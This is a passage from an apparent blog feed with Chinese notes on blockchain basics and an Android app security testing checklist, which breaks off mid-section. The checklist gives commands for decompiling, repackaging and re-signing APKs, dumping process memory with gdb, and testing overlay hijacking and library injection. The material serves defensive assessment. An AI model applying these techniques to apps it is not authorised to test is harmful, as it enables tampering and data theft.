    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li> <a href="#org8c66cd0">区块链定义</a></li></ol><p><a id="org8c66cd0"></a></p><h1 id="区块链定义"><a href="#区块链定义" class="headerlink" title="区块链定义"></a>区块链定义</h1><p>区块链最核心的价值体现在 <strong>去中心化</strong> 、*不可篡改* 、*可溯源*<br>用分布式数据库技术识别、传播和记载信息的智能对等网络<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup><br>从狭义上讲通过数字货币看区块链,它既是数据结构,又是分布式账本,更是一套技术方案。</p><ul><li>  数据结构: 区块链是一种由交易数据构成的区块按时间先后顺序通过区块哈希指针相连组成的链式数据结构</li><li>  分布式账本: 区块链记录了全网发生的所有交易情况</li><li>  技术方案: 区块链构建了比特币的底层技术，保证比特币系统的正常运行</li></ul><p>从广义上讲，区块链技术使用了一种全新的分布式基础架构和计算方式</p><ol><li> 利用链式结构保证数据的完整性，并存储数据;</li><li> 利用密码学来保证数据的可靠性,以及数据的传输和访问安全;</li><li> 利用分布式节点独立运行统一的共识算法来获取数据的记录权，进而更新存储的数据，实现可信任的数据共享;</li><li> 利用智能合约里面的代码自动操作数据，进而保证合约执行不受外界干扰。</li></ol><p>保证隐私的技术🔐-加密</p><ul><li><p>对称(私钥)加密: 加解密互为逆操作,私钥加密，私钥解密<br>  常见的对称加密算法有DES、3DES、AES、Blowfish、IDEA、RC5、RC6</p></li><li><p>非对称加密: 公钥和私钥互为加解密工具，不能x钥加密，x钥解密。私钥可以计算出公钥<br>  公钥加密,私钥签名</p></li></ul><p>数字世界的身份证🆔-哈希<br>哈希算法是将文件映射为较短的固定长度字符串(哈希值)</p><p>相同文件哈希值相同，不可逆推，计算极快</p><p>数字签名: 抗抵赖、不可伪造、可轻松识别</p><p><a href="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220131104740.png">签名、加解密过程</a></p><p>Centralized &#x2013;&gt; Distributed &#x2013;&gt; Decentralized &#x2013;&gt; P2P(拥有一定共识，动力来自底层节点，没有第三方中心节点的统一指挥)</p><p>CAP定理: 在分布式系统中,必然无法同时满足一致性(consistency)、可用性(Availability)、分区容忍性(Partition Tolerance), CAP三者最多得其二</p><h1 id="Footnotes"><a href="#Footnotes" class="headerlink" title="Footnotes"></a>Footnotes</h1><p><sup><a id="fn.1" href="#fnr.1">1</a></sup> 互联网是基于TCP/IP协议搭建起来的，而区块链的P2P网络依然使用的是TCP/IP协议，所以区块链是基于互联网的，它在互联网的基础上实现叠加和升级，是互联网的高级形态</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
    
    
  </entry>
  
  <entry>
    <title>Android软件测试基础</title>
    <link href="https://askding.github.io/Evolution/Android%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80.html"/>
    <id>https://askding.github.io/Evolution/Android%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80.html</id>
    <published>2022-04-20T13:36:31.000Z</published>
    <updated>2022-04-20T13:36:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#orgef93074">Android App安全基础</a><ol><li> <a href="#org6a476ce">Android APP生成过程</a></li><li><a href="#orgd65fb7b">安全测试工具</a><ol><li> <a href="#orge8f77e9">静态分析工具 - 测试App是否存在防反编译和防篡改的问题</a></li><li> <a href="#orgb66f7e9">动态分析工具 - 测试防调试、防注入、防内存转储、漏洞测试等问题</a></li><li> <a href="#org871ae98">数据包分析工具- 测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞</a></li><li> <a href="#org703824e">挂钩工具 - 解决加密时上述工具无法使用的问题</a></li></ol></li><li> <a href="#org6e514a2">App相关的信息资产</a></li></ol></li><li><a href="#org8721875">程序代码安全测试 - APP文件、程序进程</a><ol><li> <a href="#orgdcbf70e">运行环境测试</a></li><li><a href="#orge5164c6">防反编译测试</a><ol><li> <a href="#org8b4c3f1">反编译工具检测</a></li><li> <a href="#orge6edb94">代码混淆检测</a></li><li> <a href="#org241f12f">混淆强度检测</a></li><li> <a href="#org086bde5">关键代码(敏感逻辑和数据保护)检测</a></li></ol></li><li><a href="#org69ea40d">防篡改测试</a><ol><li> <a href="#orgb74ed5b">程序文件防篡改检测</a></li></ol></li><li><a href="#orgcd438a0">防调试测试</a><ol><li> <a href="#org0692e69">调试工具防护检测</a></li><li> <a href="#org4816187">调试行为防护检测</a></li><li> <a href="#org103f672">内存防护检测</a></li></ol></li><li><a href="#org6e4485b">防注入测试</a><ol><li> <a href="#org0649028">进程防护检测</a></li></ol></li></ol></li><li><a href="#org98765cf">服务交互安全测试 - 程序进程、前段界面、接口端口</a><ol><li><a href="#org6bdf04a">进程间交互</a><ol><li> <a href="#org7012d36">检测目的</a></li><li> <a href="#orge4d99d8">检测方法</a></li><li> <a href="#org0f48c98">检测结论</a></li><li> <a href="#org0829600">修复建议</a></li></ol></li><li><a href="#org5a97a7a">屏幕交互</a><ol><li> <a href="#org5bcf1f3">界面劫持检测</a></li><li> <a href="#org41702b1">防截/录屏检测</a></li></ol></li><li><a href="#org5f9f4dc">WebView交互</a><ol><li> <a href="#org8205a3e">克隆攻击检测</a></li><li> <a href="#orgceee83d">WebView安全检测</a></li></ol></li><li><a href="#org8fb541b">接口端口交互</a><ol><li> <a href="#org4a7dda8">对象反序列化检测</a></li><li> <a href="#org6df9c6d">Wormhole漏洞检测</a></li></ol></li></ol></li><li><a href="#org414f599">鉴权认证安全测试 - 接口端口、内存数据、网络通信</a><ol><li><a href="#orgf61b415">注册过程测试</a><ol><li> <a href="#orge9b7dc3">注册信息保护检测</a></li><li> <a href="#org61850ac">注册信息传输检测</a></li><li> <a href="#org155ab47">注册过程防爆破检测</a></li><li> <a href="#org0f50b35">注册过程防嗅探检测</a></li></ol></li><li><a href="#org1371bd6">登陆过程测试</a><ol><li> <a href="#orga447a0e">密码安全验证检测</a></li><li> <a href="#orgf9ae294">登陆信息加密传输检测</a></li><li> <a href="#org5300a15">登陆过程防爆破检测</a></li><li> <a href="#org771fe4a">登陆过程防嗅探检测</a></li><li> <a href="#orgbc121bd">登陆过程防绕过检测</a></li><li> <a href="#orgabc9a4b">加强认证检测</a></li></ol></li><li><a href="#orgfefe1c8">会话过程测试</a><ol><li> <a href="#orgf7b44a1">有状态会话标志检测</a></li><li> <a href="#org9be6f93">无状态会话Token检测</a></li><li> <a href="#org1ce3ca7">会话不活跃检测</a></li><li> <a href="#org71ebb3f">加强认证检测</a></li></ol></li><li><a href="#org783c152">登出过程测试</a><ol><li> <a href="#orga37a056">会话终止检测</a></li><li> <a href="#org22db691">残留数据检测</a></li></ol></li><li><a href="#org13ec53d">注销过程测试</a><ol><li> <a href="#org643d8f5">重新注册检测</a></li><li> <a href="#org0942197">数据清除检测</a></li></ol></li></ol></li><li><a href="#org8c9cd3a">本地数据安全测试 - 内存数据、本地存储</a><ol><li><a href="#org0bb8c18">数据创建测试</a><ol><li> <a href="#org2f44160">用户协议检测</a></li><li> <a href="#orgba2f37e">数据采集检测</a></li><li> <a href="#orga315219">数据输入检测</a></li><li> <a href="#orga14671a">数据生成检测</a></li></ol></li><li><a href="#org0e9c3ed">数据存储测试</a><ol><li> <a href="#org9fc890b">访问控制检测</a></li><li> <a href="#org717a8be">数据加密检测</a></li></ol></li><li><a href="#org80440e9">数据处理测试</a><ol><li> <a href="#org428e884">程序日志检测</a></li><li> <a href="#orge80508d">敏感数据不当使用检测</a></li></ol></li><li><a href="#org203f9e0">数据共享测试</a><ol><li> <a href="#orgdcc9854">第三方SDK用户协议检测</a></li><li> <a href="#org4e8592a">与第三方SDK数据共享检测</a></li></ol></li><li><a href="#orgdbf7381">数据备份测试</a><ol><li> <a href="#orgbd332d3">敏感数据备份检测</a></li><li> <a href="#org1c7a1d8">备份数据加密强度检测</a></li></ol></li><li><a href="#org1c83575">数据销毁测试</a><ol><li> <a href="#org8a07238">后台运行数据检测</a></li><li> <a href="#org57b8027">敏感数据清除检测</a></li></ol></li></ol></li><li><a href="#org3894cd3">网络传输安全测试 - 网络通信</a><ol><li><a href="#org2412456">安全传输层测试</a><ol><li> <a href="#orgefeec07">TLS实现检测</a></li><li> <a href="#orgfb44226">CA证书检测</a></li><li> <a href="#org090d933">证书校验检测</a></li><li> <a href="#org467e66d">主机名校验</a></li></ol></li><li><a href="#org764d1f9">数据加密检测</a><ol><li> <a href="#org9f7544e">检测目的</a></li><li> <a href="#orgb800ad3">检测方法</a></li><li> <a href="#orgbdb1f45">检测结论</a></li><li> <a href="#orgace36cd">修复建议</a></li></ol></li><li><a href="#org30371d5">中间人攻击测试</a><ol><li> <a href="#orgb561cf4">HTTP中间人会话劫持检测</a></li><li> <a href="#org493ff20">HTTPS中间人会话劫持检测</a></li></ol></li></ol></li><li> <a href="#org5b71f45">App加固技术</a></li></ol><p><a id="orgef93074"></a></p><h1 id="Android-App安全基础"><a href="#Android-App安全基础" class="headerlink" title="Android App安全基础"></a>Android App安全基础</h1><p><a id="org6a476ce"></a></p><h2 id="Android-APP生成过程"><a href="#Android-APP生成过程" class="headerlink" title="Android APP生成过程"></a>Android APP生成过程</h2><pre><code>graph LR    java[.java文件] --&gt;|javac|cls[.class文件]    cls[.class文件] --&gt; dx[dx]    jar[.jar文件] --&gt; dx[dx]    dx[dx] --&gt; dex[class.dex]    dex[class.dex] --&gt;|dex2oat| oat[oat格式的class.dex文件]    dex[class.dex] --&gt;aapt[aapt]    resource[resource] --&gt;aapt[aapt]    aapt --&gt; .apk文件    .apk文件 --&gt; jarsigner     jarsigner--&gt; zipalign    zipalign --&gt; signsign[signed .apk文件]</code></pre><ol><li> 通过<del>javac</del> 将java源代码生成字节码.class文件</li><li>通过<del>dx &#x2013;dex &#x2013;output=class.dex Test.class</del>将.class文件和jar包生成Android App可执行文件class.dex<br> oat格式文件是android系统自带的ELF文件格式，包括classes.dex文件内容，及classes.dex文件转换的机器指令，存储在<del>/data/dalbik-cache/arm/data@<a href="mailto:&#x41;&#x70;&#112;&#64;&#99;&#x6f;&#109;&#46;&#x64;&#101;&#x6d;&#x6f;&#x2e;&#116;&#101;&#x73;&#116;&#x2d;&#49;">&#x41;&#x70;&#112;&#64;&#99;&#x6f;&#109;&#46;&#x64;&#101;&#x6d;&#x6f;&#x2e;&#116;&#101;&#x73;&#116;&#x2d;&#49;</a>@test.apk@classes.dex</del></li><li> 通过<del>aapt</del>将.dex文件和其他音视频资源文件打包成.apk文件</li><li> 通过jarsigner对生成的apk文件进行数字签名，防止APP被篡改</li><li> 通过zipalign使apk文件压缩部分在字节边界上使对齐</li></ol><p><a id="orgd65fb7b"></a></p><h2 id="安全测试工具"><a href="#安全测试工具" class="headerlink" title="安全测试工具"></a>安全测试工具</h2><p><a id="orge8f77e9"></a></p><h3 id="静态分析工具-测试App是否存在防反编译和防篡改的问题"><a href="#静态分析工具-测试App是否存在防反编译和防篡改的问题" class="headerlink" title="静态分析工具 - 测试App是否存在防反编译和防篡改的问题"></a>静态分析工具 - 测试App是否存在防反编译和防篡改的问题</h3><ul><li><p><input disabled="" type="checkbox">  apktool 检测防篡改能力</p><ol><li><p>反编译</p><pre><code> java -jar apktool.jar d -f Test.apk</code></pre></li><li><p>重打包</p><pre><code> java -jar apktool.jar b -f directory_name -o Test.apk java -jar signapk.jar testkey.x509.pem testkey.pk8   old.apk new.apk</code></pre></li></ol></li><li><p><input disabled="" type="checkbox">  baksmali  作用 classes.dex -反编译-&gt; smali</p><pre><code>  java -jar  baksmali.jar  classes.dex  -o smalifile</code></pre></li><li><p><input disabled="" type="checkbox">  smail 作用 smali &#x2013;&gt; classes.dex</p><pre><code>  java -jar smali.jar smalifile -o classes.dex</code></pre></li><li><p><a href="https://github.com/pxb1988/dex2jar">dex2jar</a>  作用 dex &#x2013;&gt; jar</p><pre><code>  sh d2j-dex2jar.sh -f ~/path/to/apk_to_decompile.apk</code></pre></li><li><p>  [ ] jd-gui 作用 展示jar包中源码</p></li><li><p>  [ ] <a href="https://bbs.pediy.com/thread-259895.htm">jeb</a> 用于逆向工程/审计apk文件的反编译工具</p></li></ul><p><a id="orgb66f7e9"></a></p><h3 id="动态分析工具-测试防调试、防注入、防内存转储、漏洞测试等问题"><a href="#动态分析工具-测试防调试、防注入、防内存转储、漏洞测试等问题" class="headerlink" title="动态分析工具 - 测试防调试、防注入、防内存转储、漏洞测试等问题"></a>动态分析工具 - 测试防调试、防注入、防内存转储、漏洞测试等问题</h3><ul><li>  [ ] DDMS(Dalvik debug monitor service)是安卓开发环境中的Dalvik虚拟机调试监控服务</li><li>  [ ] gdb(GNU project debugger)是LInux系统的GCC调试工具</li><li>  [ ] IDA Pro 逆向神器 脱壳</li><li>  [ ] Drozer是一个进行综合安全评估的Android安全测试框架</li></ul><p><a id="org871ae98"></a></p><h3 id="数据包分析工具-测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞"><a href="#数据包分析工具-测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞" class="headerlink" title="数据包分析工具- 测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞"></a>数据包分析工具- 测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞</h3><ul><li>  [ ] Burpsuite/Fiddler</li><li>  [ ] Wireshark</li></ul><p><a id="org703824e"></a></p><h3 id="挂钩工具-解决加密时上述工具无法使用的问题"><a href="#挂钩工具-解决加密时上述工具无法使用的问题" class="headerlink" title="挂钩工具 - 解决加密时上述工具无法使用的问题"></a>挂钩工具 - 解决加密时上述工具无法使用的问题</h3><ul><li>  [ ] Xposed框架<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> 在不修改APK文件的情况下控制程序运行</li><li>  [ ] Frida 开源的跨平台挂钩框架，用来脱壳关键的函数，达到内存转储的目的</li><li>  [ ] inject App进程注入评测工具</li></ul><p><a id="org6e514a2"></a></p><h2 id="App相关的信息资产"><a href="#App相关的信息资产" class="headerlink" title="App相关的信息资产"></a>App相关的信息资产</h2><ul><li>  App文件<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup></li><li>  程序进程</li><li>  内存数据</li><li>  前端界面<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup></li><li>  本地存储</li><li>  网络通信</li><li>  交互接口</li><li>  云端平台</li></ul><p><a id="org8721875"></a></p><h1 id="程序代码安全测试-APP文件、程序进程"><a href="#程序代码安全测试-APP文件、程序进程" class="headerlink" title="程序代码安全测试 - APP文件、程序进程"></a>程序代码安全测试 - APP文件、程序进程</h1><p><a id="orgdcbf70e"></a></p><h2 id="运行环境测试4"><a href="#运行环境测试4" class="headerlink" title="运行环境测试4"></a>运行环境测试<sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup></h2><p><a id="orge5164c6"></a></p><h2 id="防反编译测试5"><a href="#防反编译测试5" class="headerlink" title="防反编译测试5"></a>防反编译测试<sup><a id="fnr.5" class="footref" href="#fn.5" role="doc-backlink">5</a></sup></h2><p><a id="org8b4c3f1"></a></p><h3 id="反编译工具检测"><a href="#反编译工具检测" class="headerlink" title="反编译工具检测"></a>反编译工具检测</h3><ol><li><p>检测目的</p><p> 检测App是否可以防止反编译工具，是否具有防逆向保护措施</p></li><li><p>检测方法</p><ol><li> 通过反编译工具对apk文件进行反编译，查看是否具有防逆向保护措施</li><li> 通过IDA Pro等反汇编工具对动态库so文件进行反汇编，查看App是否具有防反汇编的能力</li></ol></li><li><p>检测结论</p><p> 若App的dex文件和so文件无法正常反编译或者App经过加固处理，则通过测试</p></li><li><p>修复建议</p><p> 对App文件结构进行变形或加密，让反编译工具无法识别，或对App文件进行加固处理</p></li></ol><p><a id="orge6edb94"></a></p><h3 id="代码混淆检测"><a href="#代码混淆检测" class="headerlink" title="代码混淆检测"></a>代码混淆检测</h3><ol><li><p>检测目的</p><p> 检测App反编译后的源码是否经过混淆处理</p></li><li><p>检测方法</p><p> 通过反编译工具对apk文件进行反编译，查看代码中的类、字段和方法是否经过混淆处理</p></li><li><p>检测结论</p><p> 若反编译后源码中的类、字段和方法使用a、b、c、d等无意义的字符重命名，则通过测试</p></li><li><p>修复建议</p><p> 对App源码进行混淆处理</p></li></ol><p><a id="org241f12f"></a></p><h3 id="混淆强度检测"><a href="#混淆强度检测" class="headerlink" title="混淆强度检测"></a>混淆强度检测</h3><ol><li><p>检测目的</p><p> 检测App反编译后的源码的混淆强度，查看是否能够有效地保护代码安全</p></li><li><p>检测方法</p><ol><li> 检测dex文件代码中所有的类名、函数名、字段、方法，是否都经过混淆处理，例如反编译后无法正常识别Java层函数的功能</li><li> 检测so文件中所有类名、函数名、字段、方法，是否都经过混淆处理，例如反汇编后无法正常识别Native层函数功能</li></ol></li><li><p>检测结论</p><p> 若反编译后代码*不能识别*出App函数的功能，则通过测试</p></li><li><p>修复建议</p><p> 针对dex文件和so文件的类名、函数名、字段、方法进行高强度混淆</p></li></ol><p><a id="org086bde5"></a></p><h3 id="关键代码-敏感逻辑和数据保护-检测"><a href="#关键代码-敏感逻辑和数据保护-检测" class="headerlink" title="关键代码(敏感逻辑和数据保护)检测"></a>关键代码(敏感逻辑和数据保护)检测</h3><ol><li><p>检测目的</p><p> 检测App是否对关键代码和数据实施有效的保护措施，是否暴露业务逻辑</p></li><li><p>检测方法</p><p> 通过反编译工具对apk文件进行反编译，结合manifest.xml配置文件，分析App注册、登陆、支付过程、加密算法、数据通信等关键功能代码，查看相关代码逻辑是否有明显的暴露</p></li><li><p>检测结论</p><p> 若App关键业务代码(如相关业务字符串)未暴露，且关键数据经过加密和隐藏保护处理，则通过测试</p></li><li><p>修复建议</p><p> 将App关键代码进行隐藏、混淆、加壳等处理，从而无法逆向出重要的代码信息</p></li></ol><p><a id="org69ea40d"></a></p><h2 id="防篡改测试6"><a href="#防篡改测试6" class="headerlink" title="防篡改测试6"></a>防篡改测试<sup><a id="fnr.6" class="footref" href="#fn.6" role="doc-backlink">6</a></sup></h2><p><a id="orgb74ed5b"></a></p><h3 id="程序文件防篡改检测"><a href="#程序文件防篡改检测" class="headerlink" title="程序文件防篡改检测"></a>程序文件防篡改检测</h3><ol><li><p>检测目的</p><p> 检测App启动时是否进行了完整性校验，是否对客户端代码、资源文件进行修改，是否具有防篡改机制</p></li><li><p>检测方法</p><ol><li>使用反编译工具Apktool对目标文件进行反编译<br> <code>java -jar apktool.jar d -f /path/to/test.apk</code></li><li> 修改相关代码，篡改AndroidManifest.xml、assets文件、res文件等</li><li>使用apktool重新打包签名后再运行App查看运行结果<br> <code>java -jar apktool b -f /path/to/test</code></li></ol></li><li><p>检测结论</p><p> 若打包后安装后*不能正常运行*，则通过测试</p></li><li><p>修复建议</p><p> 采用完整性校验技术对安装包进行校验，校验对象包括原包中代码、资源文件、配置文件等所有文件，一旦校验失败，立即退出</p></li></ol><p><a id="orgcd438a0"></a></p><h2 id="防调试测试7"><a href="#防调试测试7" class="headerlink" title="防调试测试7"></a>防调试测试<sup><a id="fnr.7" class="footref" href="#fn.7" role="doc-backlink">7</a></sup></h2><p><a id="org0692e69"></a></p><h3 id="TODO-调试工具防护检测"><a href="#TODO-调试工具防护检测" class="headerlink" title="TODO 调试工具防护检测"></a>TODO 调试工具防护检测</h3><ol><li><p> 检测目的</p></li><li><p> 检测方法</p></li><li><p> 检测结论</p></li><li><p> 修复建议</p></li></ol><p><a id="org4816187"></a></p><h3 id="TODO-调试行为防护检测"><a href="#TODO-调试行为防护检测" class="headerlink" title="TODO 调试行为防护检测"></a>TODO 调试行为防护检测</h3><ol><li><p> 检测目的</p></li><li><p> 检测方法</p></li><li><p> 检测结论</p></li><li><p> 修复建议</p></li></ol><p><a id="org103f672"></a></p><h3 id="内存防护检测"><a href="#内存防护检测" class="headerlink" title="内存防护检测"></a>内存防护检测</h3><ol><li><p>检测目的</p><p> 检测App内存是否具有内存防护功能，防止内存转储</p></li><li><p>检测方法</p><ol><li> 运行App，使用ps命令查看进程PID</li><li> 使用 <code>gdb -p &lt;PID&gt;</code> 挂载App进程后，使用 <code>(gdb) gcore</code> 转储内存</li></ol></li><li><p>检测结论</p><p> 若未生成corefile <code>core.&lt;pid&gt;</code> ,则通过测试</p></li><li><p>修复建议</p><p> 通过监控 <code>/proc/pid/mem</code> 和 <code>/proc/pid/pagemep</code> 来防止内存转储</p></li></ol><p><a id="org6e4485b"></a></p><h2 id="防注入测试8"><a href="#防注入测试8" class="headerlink" title="防注入测试8"></a>防注入测试<sup><a id="fnr.8" class="footref" href="#fn.8" role="doc-backlink">8</a></sup></h2><p><a id="org0649028"></a></p><h3 id="进程防护检测"><a href="#进程防护检测" class="headerlink" title="进程防护检测"></a>进程防护检测</h3><ol><li><p>检测目的</p><p> 检测App进程空间是否可以被注入第三方动态so文件</p></li><li><p>检测方法</p><ol><li> 运行App，通过注入工具或脚本，将第三方动态库文件注入App进程空间，查看第三方动态库是否在进程的内存空间中</li></ol></li><li><p>检测结论</p><p> 若第三方动态库文件*不能注入*到目标进程空间，则通过测试</p></li><li><p>修复建议</p><ul><li>  增加ptrace函数的检测功能，使第三方无法使用该函数附加进程</li><li>  修改linker中的dlopen函数，防止第三方进行so加载</li><li>  定时检测App加载的第三方so库，若发现使被注入的so库，程序进程立即报异常</li></ul></li></ol><p><a id="org98765cf"></a></p><h1 id="服务交互安全测试-程序进程、前段界面、接口端口"><a href="#服务交互安全测试-程序进程、前段界面、接口端口" class="headerlink" title="服务交互安全测试 - 程序进程、前段界面、接口端口"></a>服务交互安全测试 - 程序进程、前段界面、接口端口</h1><p><a id="org6bdf04a"></a></p><h2 id="进程间交互"><a href="#进程间交互" class="headerlink" title="进程间交互"></a>进程间交互</h2><p><a id="org7012d36"></a></p><h3 id="检测目的"><a href="#检测目的" class="headerlink" title="检测目的"></a>检测目的</h3><p>检测进程间数据通信是否具有泄露用户信息的风险</p><p><a id="orge4d99d8"></a></p><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>查看AndroidManifest.xml文件中的<activity>、<provider>、<receiver>、<service>标签内的exported属性是否为false</p><ul><li>  <code>&lt;activity android:exported=&quot;true&quot;</code> 则可以被第三方App启动</li><li>  <code>&lt;provider android:authorities=&quot;com.bgy.ssm.fileprovider&quot; android:exported=&quot;true&quot;</code> 则可以被第三方app调用，实现增、删、改、查</li><li>  <code>&lt;receiver android:exported=&quot;true&quot;</code> 则可以接收第三方App发送的广播消息</li><li>  <code>&lt;service android:enabled=&quot;true&quot; android:exported=&quot;true&quot;</code> 则可以被第三方app启动</li></ul><p><a id="org0f48c98"></a></p><h3 id="检测结论"><a href="#检测结论" class="headerlink" title="检测结论"></a>检测结论</h3><p>客户端App用于跨进程通信的4种组建分别为Activity、ContentProvider、BroadCast、Service<br>在 <strong>未明确要求</strong> 的情况下，只要以上配置中存在任一 <code>exported=true</code> 则测试 <strong>不通过</strong></p><p><a id="org0829600"></a></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>在未明确要求的情况下，在AndroidManifest.xml配置文件中设置该组建的exported属性为false，或对组建进行权限</p><p><a id="org5a97a7a"></a></p><h2 id="屏幕交互"><a href="#屏幕交互" class="headerlink" title="屏幕交互"></a>屏幕交互</h2><p><a id="org5bcf1f3"></a></p><h3 id="界面劫持检测"><a href="#界面劫持检测" class="headerlink" title="界面劫持检测"></a>界面劫持检测</h3><ol><li><p>检测目的</p><p> App是否具有防界面劫持(UI欺骗)功能，防止黑客伪造界面对原有界面进行覆盖，窃取用户和密码等敏感信息</p></li><li><p>检测方法</p><ol><li><p>反编译源码，查看是否具有检测程序进入后台运行的代码, 当程序不是因为触摸返回键和HOME键今后后台运行时，提醒用户具有被劫持的风险</p><pre><code> @Override public boolean onKeyDown(int keyCode, KeyEvent event)&#123;     // 判断程序进入后台运行是否未触摸返回键和HOME键造成的     if((keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_HOME)        &amp;&amp; event.getRepeatCount()==0)&#123;         flag = false;     &#125;     return super.onKeyDown(keyCode, event); &#125; @Override protected void onPause()&#123;     // 程序进入后台如果不是触摸返回键和HOME键造成的，则进行劫持风险提示     if(flag)&#123;         // 弹出警示信息         Toast.makeText(getApplicationContext(),                        &quot;程序已经进入后台运行，具有劫持的风险&quot;,                        Toast.LENGTH_SHORT).show();     &#125;     super.onPause(); &#125;</code></pre></li><li><p> 编写透明界面，当运行至登陆、支付等界面时进行覆盖，查看是否具有风险提示</p></li></ol></li><li><p>修复建议</p><p> 对App的UI界面进行校验，强制将自身UI时刻设置成顶层显示，其中HOME键除外，或自身UI界面进入后台运行后弹框提示用户App已经进入后台运行，有界面劫持风险</p></li></ol><p><a id="org41702b1"></a></p><h3 id="防截-录屏检测"><a href="#防截-录屏检测" class="headerlink" title="防截/录屏检测"></a>防截/录屏检测</h3><ol><li><p>检测目的</p><p> 检测App运行后是否存在防截/录屏保护措施</p></li><li><p>检测方法</p><ol><li> 通过 <code>screencap</code> 命令进行连续截屏，查看界面后的图片是否显示敏感信息</li><li> 通过 <code>screenrecord</code> 命令进行录屏，查看录制后的视频是否显示敏感信息</li></ol></li><li><p>修复建议</p><p> App要实现防截录屏的保护措施</p></li></ol><p><a id="org5f9f4dc"></a></p><h2 id="WebView交互"><a href="#WebView交互" class="headerlink" title="WebView交互"></a>WebView交互</h2><p><a id="org8205a3e"></a></p><h3 id="克隆攻击检测"><a href="#克隆攻击检测" class="headerlink" title="克隆攻击检测"></a>克隆攻击检测</h3><ol><li><p>检测目的</p><p> 检测App中是否存在设置为可被导出的Activity组件，且组建中包含WebView调用，存在导致敏感信息泄露的风险</p></li><li><p>检测方法</p><ol><li> 通过JEB攻击反编译dex文件的源码，查看客户端是否使用了WebView空间，并将 <code>setAllowFileAccessFromeFileURLs</code> 或 <code>setAllowUninvertedFileAccessFromFileURLs</code> API设置为 <code>true</code></li><li> 检测file域的路径是否做了严格限制</li></ol></li><li><p>检测结论</p><p> 若App使用WebView组建，并将 <code>setAllowFileAccessFromeFileURLs</code> 或 <code>setAllowUninvertedFileAccessFromFileURLs</code> API设置为 <code>false</code> ，则通过测试<br> 若App使用WebView组建，并将 <code>setAllowFileAccessFromeFileURLs</code> 或 <code>setAllowUninvertedFileAccessFromFileURLs</code> API设置为 <code>true</code> ，且file域的路径做了严格限制，则通过测试</p></li><li><p>修复建议</p><p> 严格限制包含WebView调用的Activity组建的导出权限，关闭导出权限或限制导出组建的发起者</p></li></ol><p><a id="orgceee83d"></a></p><h3 id="WebView安全检测"><a href="#WebView安全检测" class="headerlink" title="WebView安全检测"></a>WebView安全检测</h3><ol><li><p>检测目的</p><p> 检测App使用的WebView空间加载的外部资源是否存在潜在风险</p></li><li><p>检测方法</p><p> 检测App源码，查看客户端是否对WebView对空间加载的资源文件进行了校验，过滤风险代码</p></li><li><p>检测结论</p><p> App使用WebView空间减灾的HTML未明确要求使用Javascript，<br> 未对加载文件进行校验，或未使用安全的通信协议，<br> 并在WebView加载的程序中有实现发送短信，拨打电话等敏感行为的操作代码，则本项测试不通过</p></li><li><p>修复建议</p><ul><li>  WebView加载的HTML页面，在未明确要求的情况下，禁用Javascript</li><li>  对WebView加载的外部文件进行校验</li><li>  采用HTTPS安全通信协议，不要在WebView加载的外部文件中实现敏感操作的代码</li></ul></li></ol><p><a id="org8fb541b"></a></p><h2 id="接口端口交互"><a href="#接口端口交互" class="headerlink" title="接口端口交互"></a>接口端口交互</h2><p><a id="org4a7dda8"></a></p><h3 id="对象反序列化检测"><a href="#对象反序列化检测" class="headerlink" title="对象反序列化检测"></a>对象反序列化检测</h3><ol><li><p>检测目的</p><p> 检测App是否使用安全的API实现序列化和反序列化，是否存在反序列化漏洞</p></li><li><p>检测方法</p><ol><li> 通过JEB工具反编译dex文件的源码，查看客户端App是否具有实现序列化和反序列化的源代码</li><li> 检测实现序列化和反序列化的API是否具有潜在风险和漏洞</li></ol></li><li><p>检测结论</p><p> 若客户端App不具有序列化和反序列化的代码，或实现序列化和反序列化的API不具有潜在风险和漏洞，则通过测试</p></li><li><p>修复建议</p><p> App采用安全框架的API实现序列化和反序列化</p></li></ol><p><a id="org6df9c6d"></a></p><h3 id="Wormhole漏洞检测"><a href="#Wormhole漏洞检测" class="headerlink" title="Wormhole漏洞检测"></a>Wormhole漏洞检测</h3><ol><li><p>检测目的</p><p> 检测App是否存在Wormhole漏洞</p></li><li><p>检测方法</p><ol><li> 